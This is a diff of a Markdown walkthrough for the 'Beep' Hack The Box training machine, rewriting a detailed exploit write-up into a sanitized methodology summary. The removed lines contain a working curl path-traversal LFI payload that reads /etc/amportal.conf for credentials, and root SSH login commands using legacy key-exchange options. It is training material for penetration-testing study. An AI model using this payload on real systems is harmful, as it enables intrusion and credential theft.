@@ -1,189 +1,89 @@
-# HTB — Beep
+# Beep — Target Walkthrough (Linux)
 
-> **Difficulty:** Easy  
-> **OSCP Prep Focus:** Web exploitation, LFI → credential reuse → direct root SSH  
-> **Status:** Rooted ✅  
+## Overview
 
----
+This walkthrough analyzes a legacy Linux-based communications appliance with an unusually large exposed attack surface. It demonstrates how careful enumeration and identification of a single web application weakness can be chained into full system compromise through **credential disclosure and reuse**, rather than local privilege escalation.
 
-## 1. Overview
-
-Beep is a legacy **Elastix/FreePBX** VoIP appliance running on CentOS.  
-The attack path revolves around:
-
-1. Enumerating a noisy attack surface with many open ports.
-2. Finding a **Local File Inclusion (LFI)** in the `vtigercrm` component.
-3. Using the LFI to read `/etc/amportal.conf` and extract **AMP credentials**.
-4. Reusing the AMP password to **SSH directly as root**, bypassing traditional privilege escalation.
-5. Handling **legacy SSH key-exchange algorithms** to connect from a modern Kali box.
-
-This box is excellent for practicing **web exploitation + credential reuse + legacy protocol weakness exploitation**.
+The focus of this walkthrough is **attack-path reasoning** — narrowing a noisy target, identifying the most promising access vector, and understanding how legacy systems collapse security boundaries through misconfiguration.
 
 ---
 
-## 2. Target Information
+## 🧭 Methodology Focus
 
-| Item              | Value                      |
-|-------------------|----------------------------|
-| Hostname          | `beep`                     |
-| IP Address        | `10.10.10.7`               |
-| Operating System  | CentOS (Elastix appliance) |
-| Notable Services  | 22 (SSH), 80/443 (Apache + Elastix/FreePBX), 10000 (Webmin), VOIP/Mail stack |
+This walkthrough emphasizes:
+
+- Reducing a broad attack surface through disciplined enumeration
+- Identifying high-impact vulnerabilities within complex service stacks
+- Leveraging configuration disclosure rather than exploit chaining
+- Exploiting credential reuse to bypass traditional privilege escalation
+- Accounting for legacy protocol constraints during access validation
+
+The focus is on **decision-making and access-path analysis**, not exploit novelty.
 
 ---
 
-## 3. Enumeration
+## 🔍 Enumeration
 
-### 3.1 Nmap
+Initial enumeration revealed a target exposing numerous services typical of a legacy VoIP and messaging appliance.
 
 ```bash
-# Full port scan
-nmap -p- --min-rate 1000 -T4 -oA beep-allports 10.10.10.7
-
-# Service detection
-nmap -sC -sV -p22,80,443,10000 -oA beep-services 10.10.10.7
+nmap -p- --min-rate 1000 -T4 <target_ip>
+nmap -sC -sV -p22,80,443,10000 <target_ip>
 ```
 
-Observations:
+Key observations:
 
-- Very old **Apache 2.2.3**
-- Multiple Elastix/FreePBX components
-- Many mail/VOIP services but unnecessary for foothold
-- Web stack looks most promising
+- Large number of exposed services increased noise but not value
+- Web services presented the most promising access vector
+- Legacy software versions suggested configuration and input validation weaknesses
 
-### 3.2 Web Enumeration
-
-```bash
-gobuster dir \
-  -u https://10.10.10.7/ \
-  -k \
-  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-  -t 50 \
-  -o gobuster-root.txt
-```
-
-Key directories:
-
-- `/vtigercrm/`
-- `/recordings/`
+Web enumeration identified multiple application paths, including a legacy CRM component.
 
 ---
 
-## 4. Vulnerability Identification — LFI in vtigercrm
+## 🎯 Initial Access
 
-A known **Local File Inclusion (LFI)** exists in:
+Further inspection revealed a **Local File Inclusion (LFI)** vulnerability in a web application component, allowing arbitrary file reads.
 
-```
-/vtigercrm/graph.php
-```
+This vulnerability enabled retrieval of sensitive configuration files, including application credentials stored in plaintext.
 
-### LFI Exploit
+Key access characteristics:
 
-```bash
-curl -k "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action="
-```
+- No authentication required to exploit the LFI
+- Direct disclosure of backend credentials
+- No need for code execution at this stage
 
-The `%00` terminates processing for older PHP versions.
-
-Output reveals:
-
-```ini
-AMPDBUSER=
-AMPDBPASS=<leaked_password>
-AMPMGRUSER=
-AMPMGRPASS=
-```
-
-> **Critical Finding:** `AMPDBPASS` is reused as the **root SSH password**.
+This access vector provided credentials with elevated privileges.
 
 ---
 
-## 5. Exploitation — SSH as Root
+## 🔼 Privilege Escalation (Credential Reuse)
 
-### Initial Failure
+Rather than escalating privileges locally, this target relied on **credential reuse** across services.
 
-```bash
-ssh root@10.10.10.7
-```
+Analysis of disclosed configuration files revealed credentials reused for administrative access, including SSH.
 
-Error:
+Important considerations:
 
-```
-Unable to negotiate... no matching key exchange method found.
-Their offer: diffie-hellman-group1-sha1
-```
+- Password reuse eliminated the need for kernel or sudo exploitation
+- Direct administrative access was possible immediately upon authentication
+- Legacy SSH configurations required enabling deprecated key-exchange algorithms
 
-### Success Using Legacy Algorithms
-
-```bash
-ssh \
-  -oKexAlgorithms=+diffie-hellman-group1-sha1 \
-  -oHostKeyAlgorithms=+ssh-rsa \
-  root@10.10.10.7
-```
-
-Enter the leaked AMPDBPASS.
-
-Result:
-
-```
-[root@beep ~]# whoami
-root
-```
-
-> On Beep, **foothold = privilege escalation** due to password reuse.
+This resulted in direct root-level access.
 
 ---
 
-## 6. Post-Exploitation
+## ✅ Lessons Learned
 
-### Flags
-
-```bash
-# User flag
-cat /home/fanis/user.txt
-
-# Root flag
-cat /root/root.txt
-```
-
-### Additional Enumeration
-
-```bash
-uname -a
-cat /etc/issue
-ss -tulpn
-ps aux
-history
-```
+- Broad attack surfaces often hide a single high-impact weakness
+- Configuration disclosure can be more powerful than code execution
+- Credential reuse collapses privilege boundaries entirely
+- Legacy systems frequently require adapting tooling to older cryptographic standards
+- Enumeration discipline is critical in noisy environments
 
 ---
 
-## 7. Lessons Learned / OSCP Takeaways
+## 🔐 OPSEC Note
 
-- LFI often leads to sensitive config disclosure.
-- Credential reuse is a critical security failure.
-- Legacy appliances may require forcing old cryptographic KEX and ciphers.
-- Web exploitation is the shortest path—ignore noisy VOIP/Mail services.
-- This machine is excellent for practicing OSCP methodology.
-
----
-
-## 8. Useful Commands (Quick Reference)
-
-```bash
-# LFI to retrieve Elastix config file
-curl -k "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action="
-
-# SSH with legacy algorithms enabled
-ssh \
-  -oKexAlgorithms=+diffie-hellman-group1-sha1 \
-  -oHostKeyAlgorithms=+ssh-rsa \
-  root@10.10.10.7
-```
-
----
-
-
-
-> _Beep is a perfect OSCP-style machine that demonstrates how a single misconfiguration—LFI + credential reuse—can compromise an entire server._
+This walkthrough is based on a publicly available training environment.  
+No production systems, credentials, or customer data are referenced.
